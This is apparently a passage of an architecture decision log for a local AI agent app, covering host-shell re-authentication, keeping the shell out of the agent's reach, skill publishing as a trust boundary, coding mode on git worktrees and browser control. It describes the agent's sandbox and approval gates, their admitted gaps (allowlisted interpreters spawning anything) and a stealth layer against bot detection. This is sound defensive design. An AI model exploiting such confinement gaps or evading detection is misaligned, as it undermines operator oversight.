  - **Deliberate WebSocket exception to the house SSE+POST pattern (`SHELL-1`).** D1 fixed the run transport as SSE-down/POST-up because a Run's shape — one server-driven event stream, occasional client control calls (`approve`, `cancel`) — never needs client→server payloads on the hot path. A PTY is the opposite shape: **bidirectional and keystroke-latency-sensitive**, with every keystroke and every resize a client→server message that must interleave with server→client output on the same connection. Modeling that as per-keystroke POSTs against an SSE stream would add round-trip latency to every character and require a second correlation mechanism for ordering; a single WebSocket carries both directions on one ordered connection, which is the transport the shape actually calls for. This is scoped to the shell — the Run substrate's SSE+POST contract (D1, D15) is unchanged and stays frozen.
  - **Host-mode re-auth is a fresh, short-TTL, single-use, constant-time-compared token (`SHELL-3`).** The global ASGI auth gate (`core/auth`, `XC-SEC-1`) only guards the **http** scope; it does not run on a WebSocket upgrade, so `/shell/ws` needed its own gate rather than inheriting one that silently doesn't apply. `POST /shell/host-mode` re-verifies the operator's password (`core.vault.verify_password` — a verifier-only check, no unlock side effect) and mints a single-use token with a short TTL; the token is required as a field in the **first WebSocket message**, checked with a constant-time comparison (mirroring `tasks.py`'s webhook-token pattern) before the PTY spawns. Single-use + short TTL bounds a leaked token's blast radius to one session opened within seconds of minting; re-verifying the password (rather than trusting the standing session cookie) means holding an open browser tab is not sufficient to reach a host shell.
  - **Agent-unreachable by construction, not by convention (`SHELL-2`).** `services/host_shell.py` is imported only by `routes/shell.py` and `app.py`'s wiring — never by anything under `tools/`, `agent/`, or `research/`, so there is no code path by which the agent's tool catalog could reach a live PTY. This is a stronger guarantee than a runtime check: a regression would have to *add* an import to introduce the hole, which `tests/test_shell_guard.py` catches by grepping every tool/agent/research module for `host_shell`/`ShellService` and failing if either name appears. The agent's only host-affecting path remains `run_host_command` (D23) — explained, approval-gated, and structurally distinct from the operator's own terminal.
  - **Kill-on-lock, not park-on-lock.** Unlike the scheduler (D13) and corpus indexers, which **park** while the vault is locked because their work is resumable, a live PTY session is holding open a real host process on the operator's behalf — parking would leave a shell session alive and unattended across a lock event, which is the opposite of what locking is supposed to guarantee. `ShellService` instead registers an `on_lock` callback (`core.vault`'s new callback registry, each wrapped in try/except so one failing subscriber can't block the lock) that calls `kill_all()`, terminating every live session (SIGHUP-then-SIGKILL grace teardown, closing the socket with 4423) synchronously at the moment the vault locks.
  - **RUN-1 stays out of this entirely — no host, no backend round trip.** The in-browser snippet runner (`RUN-1`) is unrelated to the shell's transport/auth questions by design: HTML/JS execute in a blob-URL iframe via the existing `SandboxedFrame` (`sandbox` attribute, no `allow-same-origin`), and Python runs in a self-hosted Pyodide build inside a dedicated Web Worker — both entirely client-side, never touching the host filesystem or the backend process. This is the frontend-only counterpart to D23's "sandboxed by default, host only via explained approval": `RUN-1` isn't sandboxed-on-the-host, it's *not on the host at all*, so it carries none of `SHELL-*`'s re-auth or agent-reachability concerns.
  - **Frontend mirrors the same discipline as the run stream, deliberately without its give-up budget.** `lib/stream/notificationStream.ts` reuses `runStream.ts`'s fetch-SSE/`Last-Event-ID`/backoff/watchdog pattern but retries indefinitely (capped backoff) rather than giving up after a budget — the attention stream is meant to be live for the app's whole session, not just the life of one run a user is actively watching. `lib/stream/notificationEvents.ts` is a typed mirror of the backend envelope, kept in lockstep the same way `lib/stream/events.ts` mirrors `runs/events/` — a second instance of that discipline, not an exception to it.

- **D32 — Skills as portable Agent Skills bundles (`SKILL-1..3`) 🟢 DECIDED: the open standard *is* the data model; `published` is the trust boundary; three levels of disclosure, with the bundle staged into the sandbox.** `SKILL-*` asks for reusable know-how the agent accumulates and applies. The tempting build is a bespoke table — a title, a body, a list of trigger phrases (exactly what the mock frontend modeled). That would have worked and would have been strictly worse, because a skill is the one artifact in this system with an obvious *external* life: the operator already has skills written for other tools, and the ones they write here are worth taking elsewhere. So the format is not ours to invent. A skill here is an **Agent Skills** bundle (agentskills.io — what Claude Code, claude.ai uploads, and the Skills API all read): a `SKILL.md` with YAML frontmatter plus its supporting files, imported and exported unchanged.
  - **The standard is the schema, and compliance lives in one pure module.** `services/skills/bundle.py` has no database, no vault, and no disk — it turns bytes into a validated `ParsedSkill` or refuses with the offending *field* named, and renders one back out. Every other layer is a caller: `SkillStore.create`/`update` re-run the same validators, so a skill written through the REST API is exactly as standard-compliant as one imported from a zip, and neither the routes nor the agent's tools can produce a bundle that wouldn't survive an export. The constraints enforced are the standard's, not ours (`name` ≤64 chars and `[a-z0-9-]` with `anthropic`/`claude` reserved, `description` ≤1024 and XML-tag-free, `compatibility` ≤500, one top-level directory matching the name, ≤30 MB uncompressed).
  - **Round-trip fidelity is *semantic*, not byte-exact — stated rather than glossed.** The six portable fields round-trip through typed attributes; every other frontmatter key (Claude Code extensions like `when_to_use`, `paths`, `argument-hint`) is preserved verbatim, in its original order, in a sealed `extras_json_enc` — dropping unknown keys would silently degrade a bundle on its way through us, which is the precise failure that makes a format non-portable. What is *not* preserved is YAML comments and quoting style, because we re-render rather than splice. Supporting files are always byte-identical. The test that pins this (`test_claude_code_bundle_roundtrip`) imports a realistic bundle, exports it, and re-imports it — that assertion, not the prose here, is the actual contract.
  - **Decomposed into two tables, not one sealed zip blob.** An `Upload` stores a single opaque `blob_enc` because an upload *is* opaque; a skill is structured, and all three requirements need its parts addressable. The per-turn catalog (`SKILL-2`) reads name+description without touching a single file byte; the surgical edit (`SKILL-3`) needs the instruction body as its own column; staging into the sandbox writes files straight through with nothing to unzip. `SKILL.md` is deliberately **not** a `skill_files` row — it is `body_enc` plus the frontmatter columns, rendered on demand, so the stored body and the exported artifact cannot drift apart. Cost: import unzips once, and export re-renders. Accepted.
  - **`published` is a security boundary, not a display state.** A skill is instructions the agent will follow, so an imported bundle is *inert* until a human has read it: `import_bundle` always lands `published=False, source="imported"`, and the catalog the model sees lists published skills only. `get_by_name(published_only=True)` makes a draft indistinguishable from a skill that doesn't exist — the agent is never told there is work in progress it might ask about. The agent's own `skills_create` writes drafts too, always; publication is the operator's act and nothing the model can do reaches the catalog on its own. That is also precisely the seam `SKILL-4` (auto-publishing high-confidence recoveries from the `AE-5.2` verifier) plugs into: the `source` column already distinguishes agent-authored skills, so `SKILL-4` becomes a policy about which drafts auto-promote, not new machinery.
  - **Progressive disclosure, and why it is an `@agent.instructions` block rather than a corpus source.** Level one is every published skill's name and description, injected fresh each turn (`_skill_catalog` in `agent/engine.py`, beside `_document_state`) under a character budget — `SKILL-2` says relevant skills are surfaced *automatically*, and a tool the model has to think to call is not that. Level two is `skills_open`, returning the full `SKILL.md`, paid for only when a skill is actually relevant. Level three is the bundle's own files. Enrolling skills as a corpus `SourceAdapter` was rejected on two grounds: a skill is guidance to *apply*, not knowledge to *retrieve*, so it would double-surface against the injected catalog; and corpus retrieval has no notion of `published`, so a draft could leak into context through the back door. **Known limit:** the budget drops the oldest entries with an "…and N more" tail, so a large library silently loses its tail from the prompt — publishing a skill can evict another with no signal. Ranking descriptions by retrieval is the noted scaling seam; the directory screen showing what currently fits is the v1 mitigation.
  - **Bundled scripts run in the sandbox, and only there.** `skills_open` stages the whole bundle to `/work/skills/{name}/` through `SandboxSession.write_file` — the same host-side bind-mount path `attachments_provision` already uses — so reference files are real files and scripts are ordinary sandboxed code run through `code_execute`. Nothing about a skill creates a host path: it inherits `XC-SEC-7`/D23 unchanged, and a skill that wants the host has to ask for `run_host_command` like anything else, with its explanation and its approval. Re-staging is a byte-compare, so re-opening a skill in a warm session is a no-op. Staged files carry no exec bit, so the tool's contract tells the model to invoke scripts explicitly (`python …`, `bash …`) — a small honesty about the mechanism instead of a `chmod` the sandbox seal wouldn't preserve anyway.
  - **`allowed-tools` is recorded and displayed, never enforced.** The standard's field is a per-turn tool grant in Claude Code; enforcing it here would mean removing tools from the catalog mid-turn, which contradicts `AE-4.2` ("every permitted tool available the whole turn") and D3's no-runtime-relevance-filter stance. So it is parsed, persisted, surfaced in the editor and in `skills_open`'s result labeled *advisory*, and it grants nothing and restricts nothing — the model may self-limit, and the operator can see what the author expected. The revisit trigger is explicit: if `AE-4.2` is ever relaxed, this becomes a real restriction rather than a note.
  - **A published skill is not untrusted content.** Web pages, corpus hits, and chat attachments are `wrap_untrusted`-fenced (`XC-SEC-5`) because they arrive from outside the operator's intent. A published skill arrived *through* it — the operator read the bundle and pressed publish — so fencing it as data would be theater, and would fight the whole point of a skill, which is that the model follows it. The publish gate is the control; the fence would be a second, weaker one.
  - **`name` is cleartext, and that is a genuinely weaker posture than the rest.** Description, body, files, and preserved frontmatter are all AEAD-sealed. `name` cannot be: it is simultaneously the uniqueness key, the bundle's directory name, and the handle the model calls the skill by. So anyone holding the database file learns the *topics* of the operator's skills, if not their contents — consistent with `Upload.mime` and `Document.doc_type` staying clear (D17), but worth naming rather than burying, since a skill's name is more revealing than a MIME type. A staged bundle is also re-sealed a second time inside the sandbox workspace tar on idle-reap; harmless, bounded by the 30 MB cap.
  - **Deferred:** `SKILL-4` (auto-publish above a confidence threshold — seam reserved via `source`), `SKILL-5` (benchmark testing and automatic refinement — the mock's TEST modal was deleted rather than left returning a hardcoded string), `SKILL-6` (operator overrides of built-in tool guidance), semantic search over a large skill library, and skill versioning (`SKILL-*` never asks for it; a second `DocumentVersion` was not built on spec).

- **D33 — Harness lifecycle registry 🟢 DECIDED: one owner for background start/stop order; teardown position implied by setup position.** The refactor's first move (core-harness-and-plugins reorganization). The app lifespan had grown two hand-maintained mirrors of the same sequence: every capability's `.start()` at its construction point, and a `finally` block replaying the whole thing in a bespoke stop order — 21 modules' background work (write-behind drainers, sync loops, container monitors, fire-and-forget startup tasks, clients needing closing) each wired twice, in the right position, by hand.   - **Vault lock hooks are unchanged** — services that self-register `vault.register_on_lock` in their constructors keep doing so; the registry owns process lifetime, not lock reactions. Revisit only if a consumer needs coordinated lock ordering.

- **D37 — Mid-run message steering (`CHAT-8`) 🟢 DECIDED: an inbox on the `Run`, drained at model-request boundaries; the busy 409 becomes queue-into-the-live-run; injected messages split back out at persist.** The composer was hard-locked while a run streamed — a second `POST /chat` on a busy conversation 409'd — so a mid-thought follow-up ("also check X") had to wait out the whole turn. The fix keeps the one-live-run-per-conversation invariant and adds a queue in front of it, never a second concurrent run.
  - **The inbox lives on the `Run`** (`pending_messages`, beside `parked_payload`): in-memory, synchronous `enqueue/edit/withdraw/drain` (race-free under single-threaded asyncio — no `await` between check and mutate anywhere on the path), surviving park/resume because the same `Run` object does. Four additive v1 events (`message.queued` and `message.edited` with the text inline, `message.withdrawn`, `message.injected`) make queue state fully reconstructable from SSE replay, so a reattaching client rebuilds pending bubbles with no extra endpoint.
  - **The API is conversation-scoped so the client never picks a path.** `POST /chat` on a busy conversation now enqueues into the live chat run (returning the same `run_id` + a `queued_message_id`) instead of 409ing; if the run went terminal a beat earlier the claim simply succeeds and a normal run starts. The 409 survives only where queueing is genuinely impossible: a regenerate/edit holds the claim, the run isn't a chat turn, or the send carries attachments (steering is text-only v1 — a file can't ride an existing run's request). Withdraw is `DELETE /runs/{id}/messages/{message_id}` and edit-in-place is `PATCH` on the same path (full replacement text; the message keeps its id and queue position), both 404 for a message the run has already consumed — a withdrawn/edited-too-late race resolves loudly, never silently.
  - **Two injection sites, both draining in order, neither interrupting an in-flight stream.** Mid-turn: `stream_agent_run` hands each yielded-but-not-yet-run `ModelRequestNode` to the engine, which appends one `UserPromptPart` per queued message onto the pending request — the same merged shape the library itself produces (`CallToolsNode.user_prompt`), and the approval-resume path inherits it for free. End-of-turn: when the model finishes with messages still queued, `agent/turn.py:drive_turn` continues the same run with the queued texts as trailing user requests (`prompt=None` — the regenerate continuation shape), sharing the turn's usage/loop budget so a steady drip of messages can't extend the bounds.
  - **Split at persist.** The live request that carried tool returns + injected user parts is persisted as separate `ModelRequest` nodes (tool returns, then one per message), so every steered message is an ordinary user node in the branch tree — its own bubble, its own edit/regenerate anchor — while replay stays wire-identical because the library re-merges consecutive requests at wire-prep. Same accepted live-vs-persisted divergence class as the verifier's `clean_drop` and attachment capping.
  - **Nothing queued is ever silently lost.** A message still in the inbox at terminal (cancel/error/timeout — the normal end-of-turn path consumes its queue) is dropped server-side but visible in replay as queued-never-injected; the frontend removes the pending bubble and restores the text to the composer. The frontend keeps the composer live while streaming (SEND beside STOP), renders queued bubbles with a WITHDRAW affordance, and splits the assistant flow at each `message.injected` so the live transcript matches what a reload projects.

- **D38 addendum — the `for_run()` reason was imprecise; the call was right.** D38 says a toolset registration "never reaches `for_run()`". That is not what the installed library does: `AbstractToolset.for_run(ctx)` *is* called once per run (`pydantic_ai/agent/__init__.py:1624`, `:3348`) and propagates through `CombinedToolset` and every wrapper, so the `Prefixed → Combined → filtered` stack passes it through with `RunDeps` already on `ctx.deps`. A category object is built once for the whole app, so anything that must differ *per conversation* — a workspace root, a plan store, a sub-agent's root — still needs the rebinding wrapper `tools/files.py` established. Worth recording because the mistaken reason suggests a fix (`for_run`) that compiles, passes an isolation test, and leaves both threads pointed at the wrong tree.

- **D39 — Fork a conversation from a message 🟢 DECIDED: a copy into a new thread, not a fifth move within the tree.** The store already had three ways to branch — `regenerate_point`, `edit_point`, `rewind` — and all three move the **active leaf** inside one conversation's tree. A fork is the thing none of them is: history up to a chosen turn, in an *independent* conversation, with the original untouched. Adding it as a fourth leaf move would have been wrong in the one way that matters — the operator's original thread would change.
  - **Mechanism.** Walk the active path to the tail of the chosen turn (the same "tail of *this* turn" rule `rewind` uses, so forking an assistant turn carries its tool exchanges rather than cutting the turn in half), deep-copy each node with a fresh id and re-based parent, and drain through the normal write-behind path so the copy is sealed on write like everything else.
  - **What it does not copy is the interesting part.** Runs and pins belong to the turn and the thread that held them. A compaction checkpoint keeps its summary (real history) but drops `compacted_through`, which names a node id in the source tree — carrying it would leave a dangling reference `model_history` walks into. The workspace's *contents* are not copied either: a replayed transcript can already name paths a recycled sandbox no longer has, and `attachments_provision` is the existing way back.
  - **A coding fork branches from the source's branch, not the project's base ref.** The copied transcript describes files as they are on the source conversation's branch; branching the fork from `base_ref` — what a first coding turn would otherwise do — hands it a tree that contradicts its own history, which is exactly what forking is supposed to preserve. Best-effort: a source that never cut a branch leaves the fork to cut its own normally.
  - **The route returns the fork, not the source**, so the client navigates in one round-trip; the source is claimed for the duration of the walk, since a run appending to it mid-copy would produce a fork of a history that never existed.

- **D40 — Projects, and one scope rule for lists and recall 🟢 DECIDED: `visible = unfiled ∪ active`; isolation by column, not by a second store.** A project is a directory the operator works in, and the app filters by it. The only genuinely dangerous decision here is what "filtered" means.
  - **Unfiled is global; a project *adds*; another project is never visible.** An earlier draft made lists a hard filter (`project_id = active`) and recall a union, which is two rules — and it produces a cliff: activating the first project would make the operator's entire pre-existing history, every row with `project_id IS NULL`, vanish from RECENTS, Documents, Tasks and Research at once. Unfiled-is-global makes activation purely **additive**, which is what makes the migration safe (every existing row is unfiled) and what lets a project chat still reach everything the operator has ever learned.
  - **`project_clause`, not `column.in_(visible)`.** SQL `IN` never matches NULL, so the obvious spelling silently drops every unfiled row. A query written that way looks correct, passes a test that only uses filed rows, and blanks the operator's history in production. One helper holds the rule; every scoped query calls it.
  - **The scope is resolved once, at the request edge.** `X-Ody-Project` (set in the single `authHeaders()` choke point; the literal `all` means unscoped) falls back to the stored active project, and `routes/deps.project_scope` returns the *visible set* rather than the active id so no route re-derives "unfiled plus this one" and eventually gets it wrong. Deliberate asymmetry: a **tool** never reads it. `RunDeps.project_id` comes from the conversation, because switching the active project must not change what an already-running thread is doing.
  - **Isolation is a `WHERE` clause, not a second database.** The corpus already keys every hit on a globally-unique `source_id` and already filters in SQL (`kb_excluded` proves the pattern). A per-project store would fork the retrieval path, break RRF fusion across the union above, and duplicate the sealing/embedding lifecycle — all to enforce a clause. Pinned by a test that a second project's chunks are unreachable from the first.
  - **No corpus source is created for a project's code.** Chunk-and-embed is a poor retrieval strategy for source: it dissolves the structure (imports, call sites, definitions) that makes code findable and returns plausible neighbours rather than the definition asked for. What a project *does* file into the corpus is its prose. The tools that actually work on a codebase are the ones coding mode already gives — `rg` through the shell, the file tools' own search, and the read-only explorer sub-agent. If code indexing is ever wanted, one `CorpusSource` per project through the existing `FolderAdapter` needs no new storage.
  - **The scheduler's tick is deliberately unfiltered** — it runs everyone's due tasks regardless of what the operator is looking at, and scoping it would silently stop automation.

- **D41 — Coding mode on git worktrees 🟢 DECIDED: one workspace resolver, one worktree per project, and the operator's tree written only by a merge they press.** The agent should work in a real project directory on the host. The safety question is not "can it write files" — it is *which* files, and what the operator has to do to accept them.
  - **The worktree is the boundary.** A coding conversation gets a branch (`ody/<conversation-id>`) checked out in a worktree beside the repository. The agent edits and runs tests there; the only thing that ever touches the operator's own checkout is an explicit merge. Deleting a thread with unmerged commits is refused unless the caller says to discard — merging is a deliberate act, so destroying has to be at least as deliberate, or deleting the thread becomes the quiet way to lose exactly what the merge gate protects.
  - **One worktree per *project*, not per conversation.** A worktree is a full checkout, so per-conversation means a fresh `node_modules` / `.venv` / build cache for every thread — minutes of reinstall before the agent does anything useful, and no reap policy short of deleting the thread. Sharing one keeps those caches warm, which is most of the reason to code on the host at all. The cost is that only one coding conversation can hold a project at a time, and that is **enforced** rather than allowed to silently interleave two threads over one checkout.
  - **Worktrees live outside `data_dir`.** An approved host command is fenced by `services/sandbox/host.py`, which denies reads of the whole data directory; a worktree beneath it would be unreadable by the very shell that has to build and test in it. So a worktree is plaintext on disk — a deliberate, narrow exception to at-rest encryption, and not a new exposure: it is a checkout of the operator's own already-plaintext repository.
  - **`git init` is never implicit.** Creating a repository in someone's directory and committing its whole contents is a real, visible side effect. It happens through a route the Projects UI calls after asking; the agent has no path to it.
  - **The load-bearing piece is the workspace resolver, not the shell.** Four subsystems assumed the workspace *was* the container sandbox — the file tools, `code_execute`, attachment staging, the skills bundler — and `tools/files.py` stated the invariant that held them together: *these tools reach exactly what `code_execute` reaches and nothing else*. Re-rooting only the file tools breaks that **silently**: the agent edits a file it cannot run, attachments land where its file tools can't see them, an opened skill's scripts point at a container that isn't in play. So `services/workspace.py` answers *where this run's file work happens and how a path in it is named to the model* — those differ in chat mode (`/work/...` across the bind mount) and coincide in coding mode — and all four route through it. That is what makes coding mode a mode rather than a fifth special case.
  - **Mode is a per-run tool filter, not a second catalog.** Assembling a different category map per mode would let the settings page and the agent's real stack disagree, which is the exact failure the namespacing exists to prevent. `shell` and `repo` register like every other category and are withheld from a chat run by a third source unioned into `effective_disabled_tools`, beside the operator's own set and offline's. The literal name set is checked against the real catalog by a test, because a renamed tool would otherwise stop being filtered and read as "coding tools now available in chat".
  - **What this gives up, stated plainly.** `Shell` spawns processes itself, so unlike `code_run_host_command` there is **no OS-level fence outside the worktree**: an allowlisted `python`, `make` or `uv` can spawn anything the operator can. What remains is the worktree and its throwaway branch (which is what protects the operator's actual work — the thing asked for), approval on the first command of a conversation (grantable for the thread), `denied_env_patterns` keeping model API keys out of every spawned environment, the harness's destructive-command denylist (its own README calls it a guardrail, not a security boundary), and coding mode being chosen explicitly for a thread bound to a named project. `code_run_host_command` keeps its fence unchanged — this adds a second, more permissive path rather than loosening the existing one.
  - **An allowlist was considered instead of the approval gate, and rejected.** A coding agent needs whatever build tool the project uses, so any allowlist honest enough to be useful is long enough to be meaningless — and still bypassable through an allowed interpreter. One deliberate "yes, run commands in this project" is a stronger statement and a far smaller nuisance. If the fence turns out to matter more than toolchain fidelity, the fallback is to bind-mount the worktree into the container sandbox, which trades away the operator's real `python`/`uv`/`node` — usually the whole point of coding on the host.
  - **The chassis commits, because nothing else does.** The agent has file and shell tools and no `git commit` — deliberately: when a body of work becomes a commit is not a judgement to hand the model. The first cut of this feature simply forgot to close that loop, and the result is worth recording because it *looked* correct from every angle: `diff` compares two refs, so a session that rewrote ten files reported "0 files, +0 −0", MERGE landed nothing, and the delete gate never fired — deleting the thread silently threw the work away. Every test passed, because every test committed by hand first. So `snapshot` stages and commits onto the conversation's branch, and `diff`/`merge` call it before they read; the tests now edit and **do not** commit, which is the state every real session is in.
  - **A merge refuses when the operator's checkout is on another branch**, because `git merge` lands on whatever HEAD is and the diff they reviewed was computed against the project's base ref — merging elsewhere would give them a different result from the one they read. It also **releases the project**, or the holder map keeps it locked to its first coding thread forever and the busy message names an escape ("finish or merge that one first") that cannot work.
  - **Deleting a project unfiles its rows rather than orphaning them.** `visible = unfiled ∪ active` and a deleted id can never be active again, so rows still pointing at it would vanish from every listing permanently. The operator deleted a *label*.
  - **Naming: not `CodeMode`.** The harness ships a capability literally called `CodeMode`; it is unrelated — a context-saving technique where the model writes one script that calls many tools. Ours is a mode of the *chat*, named `coding` in the wire contract and the UI.
  - **Harness capabilities deliberately not adopted:** `ClearToolResults` / `WarnNearLimits` / `ToolOutputLimits` (this codebase has exactly one context reduction — conversation compaction, on measured pressure — and taking `Coder` whole would quietly reinstate the tool-result digesting that was removed by name); `ToolApproval` / `HandleDeferredToolCalls` (the approval gate is already built on Pydantic AI's deferred-tool mechanism directly); `Researcher` (this product has its own pipeline); `Memory`, `ConversationSearch`, `Skills`, `WebSearch`, `WebFetch` (all already built against local, encrypted stores a generic capability would bypass); `ModalSandbox` (cloud). `Guardrails`, `PromptInjectionDefender` and `SpendLimits` are genuinely interesting and genuinely out of scope.
  - **⚠️ Superseded in part by D78 — the shell is fenced now.** The *"what this gives up, stated plainly"* bullet above no longer holds: every command a code conversation runs is wrapped in the same OS-level confinement an approved host command runs under, and unlike the host hatch it **refuses** rather than degrading when that confinement cannot start. The fallback it names — bind-mounting the worktree into the container sandbox — is therefore not the answer any more. *"One worktree per project"* is also qualified: a delegated `worker` takes a child worktree on its own branch beside its parent's. The branch, the merge gate, the never-implicit `git init`, the workspace resolver and mode-as-a-tool-filter all stand.

- **D43 — Portalled, collision-aware popovers 🟢 DECIDED: measure and place at open, in a body portal.** `Popover` anchored its panel with pure CSS — a `relative` root and an `absolute top-full` panel — so a menu near the viewport bottom overflowed, and, worse, the chat transcript's `overflow-y-auto` container **clipped** it outright. - **D54 — The context breakdown on a cold load 🟢 DECIDED: store the overhead on the conversation, one per thread, last turn wins.** Reopening a thread showed a single undifferentiated "In use" row where an active one showed the itemised split. The breakdown was rebuilt from a process-local `OverheadCache` keyed by conversation *mode*, so it survived only until the next backend restart — and the operator's workaround was to send a message, which is the opposite of the decision the panel exists to inform (whether to send one at all).
  - **D52's reason for not persisting was wrong about which number this is.** "Overhead is configuration, not history — it describes what the *next* turn will cost." But the figure being split is `context_footprint`: the **last response's** prompt plus generation. That is history, and it is already stale in exactly the same way if the operator toggles tools off. The panel's real claim is "the last turn cost 47K tokens, and here is what they were", so splitting it by whatever configuration a process cache happens to hold is the incoherent half. The overhead measured *on that same request* is strictly more accurate, not less.
  - **The mode key was quietly wrong too.** Keyed by mode and nothing else, a coding thread bound to project A could render project B's instruction blocks and B's enabled-tool weights. Even when the cache was warm, the split was not guaranteed to describe the conversation being looked at. Keying by the conversation removes that failure entirely rather than narrowing it.
  - **Per conversation, not per response.** The message row was the tempting home — it is where `llm_ms`/`ttft_ms`/`tool_ms` live, and it would follow a rewind or a version switch exactly, since the split would be read off whichever node is currently last on the active path. It was rejected on storage: `record()` writes one row per `ModelResponse`, so an agentic turn of eight steps is eight rows, each carrying a ~700–900 byte blob that is *identical* to its neighbours (the same agent, the same toolset, re-measured per request). A long thread would accumulate hundreds of near-duplicate copies to serve one figure that is read once, on open.
  - **What that trades away is bounded, and it is proportions only.** Rewind to an older turn and the newest turn's overhead splits that older turn's footprint. The total stays the provider's own number — every piece is scaled to it — so the error can only redistribute the bar, and only in the narrow case where tools or skills were toggled *within* one thread. Every figure derived from this already renders with a `~`. Against the behaviour it replaces (another conversation's overhead, or nothing at all) it is strictly better.
  - **The cache is gone rather than kept as a fallback.** Its only remaining job would have been serving a pre-migration thread some *other* thread's numbers, which is the contamination being removed. A thread that predates the column shows no breakdown until its next turn — exactly what every thread did on a cold start before.
  - **Stored in the clear, like the timings beside it.** Slugs and character counts: which tool categories were loaded and what each weighed. Structural metadata about a request, not the operator's content, so it takes `model`/`mode`/`ephemeral`'s posture rather than the vault's. An unreadable or malformed blob reads as absent, never as a partial guess — the same absent-not-zeroed rule the composition itself follows.

- **D55 — Attributing the standing brief 🟢 DECIDED: name the providers and read the assembled request, rather than wrap them.** D52 measured each instruction provider by wrapping it and recording the length of what it returned as it ran, because the library concatenated every provider's output into one string before the request existed and there was no seam left to cut on. Pydantic AI 2.36 grew the seam: an instruction registered with a `name` resolves to an `InstructionPart` carrying a stable `id`, and a `before_model_request` hook is handed the parts still separate. The wrapper, the per-provider bookkeeping it wrote onto the Run, and the plumbing that carried it to the measurement are all gone.
  - **The gain is not fewer lines, it is which API the readout stands on.** The old measurement reached into four library internals — the graph state's message history, the deps indirection, the tool manager's prepared definitions, the assembled instructions string — none of which carry a compatibility promise, so every failure had to be swallowed and an upgrade that moved one degraded the readout silently. Everything it needs is now a documented field on `ModelRequestParameters`. A version that moves one is a type error at the seam instead of a gauge that quietly stops itemising.
  - **The remainder stays the remainder, and that is deliberate.** `base` is still the joined brief minus the named parts, not the sum of the unnamed ones. The separators the library puts between parts are real characters on the wire and belong to nobody, so taking the total from the joined string keeps the blocks summing to what was actually sent — the same property the old clamp was defending, now exact rather than defensive.
  - **Restructuring each provider as a capability or toolset with its own `id` was rejected.** It would have produced richer keys (`capability:skills` rather than `agent:skill_catalog`) and cost a manifest-shaped change to every feature that contributes instructions, to move an attribution that a `name=` on the existing registration already carries. The wire slugs are unchanged either way, so the operator's rows are identical and the migration would have bought nothing they can see.
  - **Naming the date provider was the one behaviour change.** It previously fell into `base` with the fixed prompt; it now has its own row. A block the operator cannot switch off is arguably noise, but a `base` that silently absorbs a growing per-turn contributor is worse — the whole point of the split is that nothing large hides inside the remainder.

- **D56 — Two HTTP client generations 🟡 ACCEPTED: run both, own neither migration.** The venv carries `httpx` 0.28 and `httpx2` 2.12. Ours is the former (`core/net.py`'s pooled outbound client, search, the model registry, web fetch, the mail transports); our dependencies increasingly are the latter — Pydantic AI moved first, `anthropic` 1.0 dropped legacy `httpx` outright, and authlib 1.8 rebased its OAuth client on it.

A custom `http_client` is the one thing 1.x rejects, and there is none to reject. The `httpx.AsyncClient` in the Anthropic adapter is our own models-API call, on our own generation.
  - **Migrating our side was rejected for now**: it is a sweep across every outbound caller to buy a smaller venv, on a library whose API compatibility we would have to verify caller by caller, with no behaviour the operator can see on the other side. Recorded rather than done so the next reader knows it is a known duplication and not an oversight — and so that the day a dependency does want a client handed to it, the answer is already written down.

- **D57 — Browser control 🟢 DECIDED: attach to the browser we already run, and let the operator watch it.** The agent could *read* the web (`web_search`, `web_fetch`) and not act on it — no login-gated page, no multi-step form, no SPA it had to click through. `pydantic-ai-harness` 0.27 ships `PlaywrightBrowser`: eighteen typed tools over a real, stateful Chromium. Taking it needed four answers the library does not give.
  - **It attaches to web fetch's container, it does not launch.** The capability launches a local Chromium by default, and that is the one thing `services/webfetch/browser.py` exists to avoid: rendering a page means executing its untrusted JavaScript, which must not happen in the backend process. `cdp_url` points the session at the container that is already up, so page JS stays isolated, every request still goes out through the SSRF proxy sidecar, offline mode still owns the one lifecycle, and no Chromium binary is installed on the host. One browser, not two. **Reversed by D84:** the agent's browser is now a visible Chromium launched on the host, and the container is web fetch's alone.
  - **The egress guard is deliberately switched off, and that is the safer setting here.** `EgressPolicy` enforces its allowlist with Playwright routing, which turns on CDP's Fetch domain — which bot walls detect, and a page that trips one renders as a challenge instead of content. `block_private_addresses=False` with no allowlist leaves the policy unenforced, so no route is installed and the proxy stays the single enforcement point, out of process where it cannot be reasoned around. The default is `True`, so the call site says it out loud.
  - **The session is the conversation's, not the run's.** `PlaywrightBrowser.wrap_run` opens a browser when a run starts and closes it when the run ends — right for a one-shot agent, wrong for a chat thread, where "now open the billing page" refers to the page the operator is looking at. So the capability's lifecycle is bypassed and only its *toolset* is used, over a session `services/browser` keys by conversation and reaps on idleness, modelled on `SandboxSessionManager` down to the token tombstones. The cap on live sessions is real rather than tidy: each holds a Playwright driver subprocess.
  - **Migrating web fetch onto the harness's session was considered and rejected.** It is a strict subset of what `services/webfetch/` does — no container lifecycle, no proxy sidecar, no stealth layer, no cookie jar, and nothing resembling the render-settle-extract-distill pipeline — and its `_launch` hardcodes `new_context(...)` with no seam for context options, so adopting it would mean overriding a private method on a 0.x API that documents breaking changes between minor releases, to end up with less. The reuse runs the other way: the agent's page gets the existing `apply_stealth` and `INIT_SCRIPT` applied afterwards, through public Playwright API only.
  - **The operator watches a CDP screencast, not a strip of screenshots.** A browser the operator cannot see is a browser they cannot trust, and per-action screenshots would show the page only where a tool call happened to land — the interesting failures are between the calls. `Page.startScreencast` streams it; the ack is the entire backpressure story (Chromium withholds the next frame until it arrives), each watcher holds a one-slot queue because a stream of screenshots has no history worth replaying, and the stream only runs while somebody is watching.
  - **The panel takes the View's slot rather than joining it as a version.** A browser is a place the agent *is*, not an artifact it produced: there is nothing to version, diff, download or pin, so the version dropdown, the PREVIEW/CODE tabs and the timeline rail would all be chrome over a single live thing. It is a window and not a remote control — frames come down and nothing goes up, because letting the operator click would put two drivers on one browser between the agent's tool calls. **Reversed by D84:** the panel and the screencast are gone, the operator drives a real window, and two drivers on one page is the accepted cost.
  - **There is no `browser.live.stopped` event, deliberately.** A session outlives the run that opened it and is reaped *between* turns, when no run stream exists to carry an event — an event type with no producer would be protocol that lies. The stop reaches the panel on its own socket (`{"t":"end"}`), a close code separates a reaped session from an unknown one, and `GET /browser/session/{id}` answers for a client that reloaded, because the manager rather than the transcript is what is true about a live browser. **Superseded in part by D84:** `browser.live` and the socket are gone with the panel; the session lookup survives, and the reasoning for it does.
